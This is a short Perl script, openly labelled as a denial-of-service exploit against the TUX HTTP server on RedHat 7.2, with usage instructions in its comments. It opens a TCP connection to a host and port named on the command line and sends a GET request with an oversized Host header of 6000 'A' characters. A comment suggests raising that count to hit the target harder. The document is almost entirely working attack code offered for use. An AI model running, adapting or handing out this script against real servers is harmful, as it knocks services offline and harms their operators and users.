#!/usr/bin/perl -w
use IO::Socket;

#USE .                                          
#./tuxDOS.pl www.some.com.mx 80
#TUX HTTPD Denial of Service for RedHat 7.2 
#hecho por malcom-x 
#cantact : malcomX@antisocial.com
#####################################################################


if(@ARGV == 2){
    my $host = $ARGV[0];
    my $port = $ARGV[1];
    $EOL = "\015\012";
    $BLANK = $EOL x 2;
    #you can increment num of request in $sm change this value -> 6000 <-, for enlarge host.
    $sm = A x 6000;  
   
    $sock = IO::Socket::INET->new(PeerAddr => $host,
				  PeerPort => "$port",
				  Proto => 'tcp');
    unless($sock){
        die "jeje Not  vulnerable try later.";
	}
    $sock->autoflush(1);
    
    print $sock "GET / HTTP/1.0\nAccept: */*\nHost: ". $sm ."\n" .$BLANK;
    while ( <$sock> ){ 
	print; 
    }

    close $sock;
   }else{
    print "[Usage]...\n./tuxDOS.pl 'HosT' [port] \n";
}









